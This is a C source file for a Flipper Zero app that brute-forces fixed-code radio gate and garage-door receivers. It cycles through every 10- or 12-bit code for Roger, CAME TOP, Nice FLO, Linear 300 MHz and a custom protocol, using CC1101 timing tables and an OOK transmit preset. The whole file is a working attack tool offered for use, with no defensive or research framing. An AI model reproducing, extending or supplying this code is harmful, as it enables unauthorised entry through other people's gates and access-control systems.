// RF Gate Multi-Brand Brute-force for Flipper Zero
// Per-code TX: sends sync + each code individually — works with all gate
// receivers including sync-gated decoders (HT12D etc.).
// Roger, CAME TOP, Nice FLO, Linear 300 MHz, Custom 480µs (measured).
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <input/input.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ── Protocol table ────────────────────────────────────────────────────────────
typedef struct {
    const char* name;
    uint32_t    freq;
    uint8_t     order;     // code bit-width; brute-forces 2^order codes
    uint16_t    sync_on;   // µs
    uint16_t    sync_off;
    uint16_t    bit1_on;
    uint16_t    bit1_off;
    uint16_t    bit0_on;
    uint16_t    bit0_off;
    uint8_t     repeats;   // full sweeps through all codes
} Protocol;

// Timing values sourced from published protocol specs and Flipper SubGhz
// implementation.  CAME/Nice/Linear values are approximate.
// "Custom 480us" timing measured directly from captured RAW gate signals
// (te=480µs, long=960µs, inter-frame gap=12000µs, 28-bit fixed-code frame).
static const Protocol PROTOS[] = {
    // name            freq        ord  sOn   sOff   1on  1off   0on  0off rep
    { "Roger Gate",  433920000,  12,  100,  3100,  600,  200,  200,  600,  1 },
    { "CAME TOP",    433920000,  12,  320,  9100,  320,  640,  640,  320,  1 },
    { "Nice FLO",    433920000,  12,  500,  8500,  500, 1000, 1000,  500,  1 },
    { "Linear 300",  300000000,  10, 1200, 10000,  600, 1200, 1200,  600,  1 },
    { "Custom 480us",433920000,  12,  480, 12000,  960,  480,  480,  960,  1 },
};
#define PROTO_COUNT ((uint8_t)(sizeof(PROTOS) / sizeof(PROTOS[0])))

// ── CC1101 OOK 270 kHz async preset ──────────────────────────────────────────
static const uint8_t PRESET_OOK270[] = {
    0x02, 0x0D,  0x03, 0x47,  0x08, 0x32,  0x0B, 0x06,
    0x14, 0x00,  0x13, 0x00,  0x12, 0x30,  0x11, 0x32,
    0x10, 0x67,  0x18, 0x18,  0x19, 0x18,  0x1D, 0x40,
    0x1C, 0x00,  0x1B, 0x03,  0x20, 0xFB,  0x22, 0x11,
    0x21, 0xB6,  0x00, 0x00,
    0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ── Per-code TX callback ──────────────────────────────────────────────────────
// State machine generates [sync_on, sync_off, bit_0 on/off, ..., bit_N on/off]
// for every code in 0..(2^order - 1), repeated `repeats` times.
// No heap allocation required.
typedef enum {
    PHASE_SYNC_ON,
    PHASE_SYNC_OFF,
    PHASE_BIT_ON,
    PHASE_BIT_OFF,
} TxPhase;

typedef struct {
    const Protocol* proto;
    uint16_t        code;
    uint16_t        total_codes;
    uint8_t         pass;
    uint8_t         bit;
    TxPhase         phase;
    uint8_t         bit_val;
    FuriSemaphore*  done;
    volatile size_t progress;
    volatile bool   stop;
    volatile bool   signaled;
} TxState;

static LevelDuration tx_callback(void* ctx) {
    TxState* s = ctx;

    if(s->phase == PHASE_SYNC_ON) {
        if(s->stop || s->pass >= s->proto->repeats) {
            if(!s->signaled) {
                s->signaled = true;
                furi_semaphore_release(s->done);
            }
            return level_duration_reset();
        }
    }

    switch(s->phase) {
    case PHASE_SYNC_ON:
        s->phase = PHASE_SYNC_OFF;
        return level_duration_make(true, s->proto->sync_on);

    case PHASE_SYNC_OFF:
        s->phase = PHASE_BIT_ON;
        s->bit = 0;
        return level_duration_make(false, s->proto->sync_off);

    case PHASE_BIT_ON:
        s->bit_val = (s->code >> s->bit) & 1;
        s->phase = PHASE_BIT_OFF;
        return level_duration_make(true, s->bit_val ? s->proto->bit1_on : s->proto->bit0_on);

    default: { // PHASE_BIT_OFF
        LevelDuration ld = level_duration_make(
            false, s->bit_val ? s->proto->bit1_off : s->proto->bit0_off);
        s->bit++;
        if(s->bit < s->proto->order) {
            s->phase = PHASE_BIT_ON;
        } else {
            s->code++;
            if(s->code >= s->total_codes) {
                s->code = 0;
                s->pass++;
            }
            s->progress = (size_t)s->pass * s->total_codes + s->code;
            s->phase = PHASE_SYNC_ON;
        }
        return ld;
    }
    }
}

// ── App ───────────────────────────────────────────────────────────────────────
typedef enum { STATE_MENU, STATE_TX, STATE_DONE } AppState;

typedef struct {
    FuriMessageQueue* queue;
    FuriMutex*        mutex;
    AppState          state;
    uint8_t           sel;
    size_t            tx_progress;
    size_t            tx_total;
} AppCtx;

static void draw_cb(Canvas* canvas, void* ctx) {
    AppCtx* app = ctx;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    AppState state = app->state;
    uint8_t  sel   = app->sel;
    size_t   total = app->tx_total;
    size_t   prog  = app->tx_progress;
    furi_mutex_release(app->mutex);

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(state == STATE_MENU) {
        canvas_draw_str(canvas, 2, 10, "RF Gate Brute-Force");
        canvas_set_font(canvas, FontSecondary);
        uint8_t first = (sel >= 2) ? (sel - 1) : 0;
        if(first + 4 > PROTO_COUNT) first = (PROTO_COUNT >= 4) ? PROTO_COUNT - 4 : 0;
        for(uint8_t vi = 0; vi < 4 && (first + vi) < PROTO_COUNT; vi++) {
            uint8_t i = first + vi;
            uint8_t y = 21 + vi * 11;
            if(i == sel) {
                canvas_set_color(canvas, ColorBlack);
                canvas_draw_box(canvas, 0, y - 8, 128, 10);
                canvas_set_color(canvas, ColorWhite);
            }
            canvas_draw_str(canvas, 4, y, PROTOS[i].name);
            canvas_set_color(canvas, ColorBlack);
        }
        canvas_draw_str(canvas, 2, 63, "OK:Start  BACK:Exit");

    } else if(state == STATE_TX) {
        canvas_draw_str(canvas, 2, 10, PROTOS[sel].name);
        canvas_set_font(canvas, FontSecondary);
        uint8_t pct = total > 0 ? (uint8_t)((prog * 100) / total) : 0;
        char buf[32];
        snprintf(buf, sizeof(buf), "Sending... %3u%%", pct);
        canvas_draw_str(canvas, 2, 23, buf);
        canvas_draw_frame(canvas, 2, 27, 124, 8);
        if(pct > 0) canvas_draw_box(canvas, 3, 28, (uint8_t)(122 * pct / 100), 6);
        snprintf(buf, sizeof(buf), "%u codes x%u pass",
                 (unsigned)(1u << PROTOS[sel].order), PROTOS[sel].repeats);
        canvas_draw_str(canvas, 2, 44, buf);
        canvas_draw_str(canvas, 2, 57, "BACK to abort");

    } else {
        canvas_draw_str(canvas, 2, 10, PROTOS[sel].name);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 28, "Done!");
        char buf[28];
        snprintf(buf, sizeof(buf), "%u codes sent.",
                 (unsigned)(1u << PROTOS[sel].order));
        canvas_draw_str(canvas, 2, 40, buf);
        canvas_draw_str(canvas, 2, 55, "BACK to return");
    }
}

static void input_cb(InputEvent* event, void* ctx) {
    AppCtx* app = ctx;
    furi_message_queue_put(app->queue, event, 0);
}

// ── Entry point ───────────────────────────────────────────────────────────────
int32_t roger_gate_app(void* p) {
    UNUSED(p);

    AppCtx app = {
        .queue       = furi_message_queue_alloc(8, sizeof(InputEvent)),
        .mutex       = furi_mutex_alloc(FuriMutexTypeNormal),
        .state       = STATE_MENU,
        .sel         = 0,
        .tx_progress = 0,
        .tx_total    = 0,
    };

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_cb, &app);
    view_port_input_callback_set(vp, input_cb, &app);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);
    NotificationApp* notif = furi_record_open(RECORD_NOTIFICATION);
    view_port_update(vp);

    bool running = true;
    while(running) {
        InputEvent ev;
        if(furi_message_queue_get(app.queue, &ev, furi_ms_to_ticks(200)) != FuriStatusOk)
            continue;
        if(ev.type != InputTypeShort) continue;

        if(app.state == STATE_MENU) {
            if(ev.key == InputKeyUp) {
                app.sel = (app.sel > 0) ? app.sel - 1 : PROTO_COUNT - 1;
                view_port_update(vp);
            } else if(ev.key == InputKeyDown) {
                app.sel = (app.sel + 1) % PROTO_COUNT;
                view_port_update(vp);
            } else if(ev.key == InputKeyOk) {
                const Protocol* pr = &PROTOS[app.sel];
                uint16_t total_codes = (uint16_t)(1u << pr->order);

                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state       = STATE_TX;
                app.tx_progress = 0;
                app.tx_total    = (size_t)total_codes * pr->repeats;
                furi_mutex_release(app.mutex);
                view_port_update(vp);

                TxState tx = {
                    .proto       = pr,
                    .code        = 0,
                    .total_codes = total_codes,
                    .pass        = 0,
                    .bit         = 0,
                    .phase       = PHASE_SYNC_ON,
                    .bit_val     = 0,
                    .done        = furi_semaphore_alloc(1, 0),
                    .progress    = 0,
                    .stop        = false,
                    .signaled    = false,
                };

                furi_hal_subghz_reset();
                furi_hal_subghz_load_custom_preset(PRESET_OOK270);
                furi_hal_subghz_set_frequency_and_path(pr->freq);
                furi_hal_subghz_tx();
                furi_hal_subghz_start_async_tx(tx_callback, &tx);
                notification_message(notif, &sequence_blink_start_red);

                bool aborted = false;
                while(true) {
                    if(furi_semaphore_acquire(tx.done, furi_ms_to_ticks(50)) == FuriStatusOk)
                        break;
                    furi_mutex_acquire(app.mutex, FuriWaitForever);
                    app.tx_progress = tx.progress;
                    furi_mutex_release(app.mutex);
                    view_port_update(vp);
                    InputEvent pev;
                    while(furi_message_queue_get(app.queue, &pev, 0) == FuriStatusOk) {
                        if(pev.type == InputTypeShort && pev.key == InputKeyBack) {
                            aborted = true;
                            tx.stop = true;
                        }
                    }
                    if(aborted) break;
                }

                furi_hal_subghz_stop_async_tx();
                furi_hal_subghz_sleep();
                notification_message(notif, &sequence_blink_stop);
                furi_semaphore_free(tx.done);

                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state = aborted ? STATE_MENU : STATE_DONE;
                furi_mutex_release(app.mutex);
                view_port_update(vp);

            } else if(ev.key == InputKeyBack) {
                running = false;
            }

        } else if(app.state == STATE_DONE) {
            if(ev.key == InputKeyBack) {
                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state = STATE_MENU;
                furi_mutex_release(app.mutex);
                view_port_update(vp);
            }
        }
    }

    gui_remove_view_port(gui, vp);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);
    view_port_free(vp);
    furi_mutex_free(app.mutex);
    furi_message_queue_free(app.queue);
    return 0;
}
